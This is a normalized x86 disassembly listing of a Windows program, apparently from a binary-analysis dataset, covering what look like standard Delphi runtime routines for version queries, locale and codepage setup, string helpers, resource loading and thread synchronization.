mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403294
xor eax eax
mov [ rw-data ] eax
sub_40bd50
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4042c0
sub_40bde0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40beb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040e8
lea eax [ ebp - 0x8 ]
call j_sub_40451c#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404510
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bebd
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov eax ebx
call sub_4026e4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40be99
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404510
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_402704
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40becc
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bf44
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404510
mov edx esi
dec edx
call sub_40becc
sub_40bf80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404310
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40bfa8
pop esi
pop ebx
retn
mov eax ebx
call sub_404310
mov esi eax
sub_40bfa8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404310
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c1b8
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c000
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404310
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c1b8
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c1b8
dec eax
mov ebx eax
sub_40c090
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404310
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c000
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404310
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c0f4
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404310
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404310
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c000
mov eax esi
call sub_404310
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404310
mov [ esp ] eax
jmp r-xdata
sub_40c17c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404510
add eax esi
dec eax
call sub_40c154
sub_40c1b8
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404510
add eax ebx
dec eax
call sub_40c154
add eax ebx
sub_40c1f4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404310
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40bf44
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c228
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404310
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40bf44
test al al
jne r-xdata
mov eax ebp
call sub_404510
mov dl [ esi + edi - 0x1 ]
call sub_4087b8
test eax eax
setne bl
sub_40c26c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_4040a4
mov eax [ ebx ]
call sub_404310
mov edx eax
mov eax [ ebx ]
call sub_40c1f4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_404318
sub_40c2ac
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404510
push eax
mov eax esi
call sub_404510
mov ebp eax
mov eax ebp
pop edx
call sub_40c2e4
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c2e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408608
mov [ esp ] eax
mov eax ebp
call sub_408608
mov edi eax
mov edx ebp
mov eax esi
call sub_4087cc
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40bf68
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_4087cc
mov ebx eax
inc ebx
sub_40c384
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c3ac
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c3ac
test eax eax
jne r-xdata
sub_40c3ac
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4087b8
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40bf68
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_4087b8
mov edi eax
test edi edi
jne r-xdata
sub_40c3ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c450
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4042c0
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4080c0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c457
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_40c460
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c3ec
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c4d8
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c4c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c460
pop ecx
push ebp
call sub_40c460
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402dc8
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c64c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c917
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c4d8
call sub_40ae84
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40add4
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4040a4
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40add4
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4080c0
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40add4
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4080c0
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40ae20
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40ae20
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40add4
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4080c0
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40ae20
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40add4
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b10c
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_4040a4
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40add4
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b10c
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_4040a4
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40ae20
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40add4
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_4040a4
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40add4
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_4040a4
lea eax [ ebp - 0x8 ]
call sub_404050
lea eax [ ebp - 0xc ]
call sub_404050
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40add4
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4080c0
test eax eax
jne r-xdata
call sub_40b05c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040e8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040e8
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4043d0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4043d0
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40ae20
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c91e
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_404074
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40add4
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4080c0
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40add4
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4080c0
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4040e8
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4040e8
jmp r-xdata
sub_40c9c4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40cae7
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040e8
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4040e8
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_407d38
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407d38
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_4040e8
mov eax esi
call sub_404050
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c2ac
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40caee
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_404074
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404570
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_4043d0
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_404310
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_404570
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404318
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404310
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_404570
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404318
jmp r-xdata
sub_40cb00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cb90
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ad88
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cb97
lea eax [ ebp - 0x14 ]
call sub_404050
retn
sub_40cc28
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov ebx [ rw-data ]
mov ebx [ ebx ]
test ebx ebx
je r-xdata
push 0xa
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call FindResourceA
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadResource
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov esi ebx
push 0xa
push r-xdata
mov edi [ esi + 0x4 ]
push edi
call FindResourceA
push eax
push edi
call LoadResource
test eax eax
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_40cc98
push ebx
push esi
push edi
push ebp
push ecx
call sub_40cc28
mov ebx eax
test ebx ebx
je r-xdata
mov ebp [ rw-data ]
mov edi ebx
mov eax edi
call sub_40cbe8
mov esi eax
mov eax edi
call sub_40cbf8
mov ebp esi
mov edx rw-data
mov edi rw-data
cmp esi [ edx ]
jne r-xdata
cmp esi [ edx + 0x4 ]
jne r-xdata
cmp eax [ edi ]
je r-xdata
cmp esi [ edx + 0x8 ]
jne r-xdata
cmp eax [ edi + 0x4 ]
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov eax ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
call sub_40cc10
jmp r-xdata
mov [ esp ] al
push ebx
call FreeResource
cmp [ esp ] 0x0
jne r-xdata
sub_40cd28
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408594
mov [ rw-data ] eax
sub_40cdac
push ebx
push esi
push edi
push ebp
call sub_403608
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_402704
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403284
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035f0
sub_40ce14
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40cdfc
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ce9c
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407b74
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cd9c
mov [ ebp ] eax
sub_40ce9c
push ebx
mov ebx eax
mov eax ebx
call sub_40cdfc
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cd9c
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cedc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_40cf50
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_40cfdc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403294
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_40cfdc
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cf98
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40ce14
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cda4
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cd84
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cda4
test eax eax
je r-xdata
mov eax edi
call sub_40cf98
test bl bl
je r-xdata
mov eax edi
call sub_40cfcc
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cd84
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cd90
sub_40d078
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce14
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cda4
mov eax ebx
call sub_40cfb0
mov eax ebx
call sub_40cfa4
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce8c
sub_40d0c8
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40ce14
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40cfbc
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cd90
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cd84
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40cfbc
mov eax esi
call sub_40cfb0
sub_40d134
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce14
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ce8c
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cd84
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cfb0
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cfb0
sub_40d1ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d1d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d247
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_40568c
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403348
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d24e
lea eax [ ebp - 0x4 ]
call sub_40568c
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403348
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
